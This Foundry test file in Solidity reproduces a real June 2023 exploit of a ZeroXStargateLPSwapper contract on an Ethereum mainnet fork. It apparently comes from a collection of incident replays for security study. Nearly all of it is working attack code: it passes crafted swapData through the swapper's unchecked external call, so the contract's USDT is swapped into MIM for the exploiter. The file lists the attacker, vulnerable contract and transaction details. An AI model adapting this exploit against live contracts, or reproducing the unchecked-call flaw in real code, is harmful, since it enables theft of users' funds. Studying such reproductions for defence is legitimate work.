// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~17K USD$
// Attacker : https://etherscan.io/address/0x9d4fd681aacbc49d79c6405c9aa70d1afd5accf3
// Attack Contract : https://etherscan.io/address/0x26fe84754a1967d67b7befaa01b10d7b35bbaf0a
// Vulnerable Contract : https://etherscan.io/address/0xa5564a2d1190a141cac438c9fde686ac48a18a79
// Attack Tx : https://etherscan.io/tx/0x2c9f87e285026601a2c8903cf5f10e5b3655fbd0264490c41514ce073c42a9c3

// @Analysis
// https://twitter.com/hexagate_/status/1671188024607100928?cxt=HHwWgMC--e2poLEuAAAA

interface IDegenBox {
    function deposit(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ISwapper {
    function swap(
        address from,
        address to,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata swapData
    ) external;
}

contract MIMTest is Test {
    struct CurveData {
        address curveAddress;
        bytes4 exchangeFunctionSelector;
        int128 fromCoinIdx;
        int128 toCoinIdx;
    }

    address CurveAddress = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    bytes4 CurveFunctionSelector = bytes4(keccak256(bytes("exchange_underlying(int128,int128,uint256,uint256)")));
    int128 FromCoinIdx = 3;
    int128 ToCoinIdx = 0;

    // Stargate Tether USD Token
    IERC20 SUSDT = IERC20(0x38EA452219524Bb87e18dE1C24D3bB59510BD783);
    // Magic Internet Money Token
    IERC20 MIM = IERC20(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IDegenBox DegenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    ISwapper ZeroXStargateLPSwapper = ISwapper(0xa5564a2d1190a141CAC438c9fde686aC48a18A79);
    address private constant curveLiquidityProvider = 0x561B94454b65614aE3db0897B74303f4aCf7cc75;
    // Exploiter EOA address
    address private constant exploiter = 0x9d4fD681AacBc49D79c6405C9aA70d1afd5aCCF3;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_521_638);
        deal(address(SUSDT), exploiter, 3e6);
        cheats.startPrank(exploiter);
        SUSDT.approve(address(this), type(uint256).max);
        cheats.stopPrank();
        cheats.label(address(SUSDT), "SUSDT");
        cheats.label(address(MIM), "MIM");
        cheats.label(address(DegenBox), "DegenBox");
        cheats.label(address(ZeroXStargateLPSwapper), "ZeroXStargateLPSwapper");
        cheats.label(curveLiquidityProvider, "CurveLiquidityProvider");
        cheats.label(exploiter, "Exploiter");
    }

    // "Transaction" - name taken from the function name of the exploiter contract
    function testTransaction() public {
        emit log_named_decimal_uint(
            "Exploiter's amount of MIM tokens before attack", MIM.balanceOf(exploiter), MIM.decimals()
        );

        SUSDT.transferFrom(exploiter, address(this), 3e6);
        SUSDT.approve(address(DegenBox), type(uint256).max);
        DegenBox.deposit(address(SUSDT), address(this), address(ZeroXStargateLPSwapper), 0, 2_400_000);

        // Creating swapData which will be used for calling proxy contract inside vulnerable swap() function.
        // bytes
        //     memory auxiliaryData = hex"0000000000000000000000005a6a4d54456819380173272a5e8e9b9904bdf41ba6417ed60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000";
        bytes memory auxiliaryDatas = abi.encode(CurveAddress, CurveFunctionSelector, FromCoinIdx, ToCoinIdx);
        bytes memory data = abi.encodeWithSignature(
            "sellToLiquidityProvider(address,address,address,address,uint256,uint256,bytes)",
            address(USDT), // inputToken
            address(MIM), // outputToken
            curveLiquidityProvider, // provider
            exploiter, // recipient
            USDT.balanceOf(address(ZeroXStargateLPSwapper)), // sellAmount
            16_716_883_658_670_000_000_000, // minBuyAmount
            auxiliaryDatas // auxiliaryData
        );

        // By making call to zeroXEchangeProxy.call(swapData) inside swap function,
        // exploiter could swap the USDT owned by ZeroXStargateLPSwapper contract to MIM tokens in which the recipient is the attacker
        ZeroXStargateLPSwapper.swap(address(this), address(this), address(this), 0, 1_920_000, data);

        emit log_named_decimal_uint(
            "Exploiter's amount of MIM tokens after attack", MIM.balanceOf(exploiter), MIM.decimals()
        );
    }
}
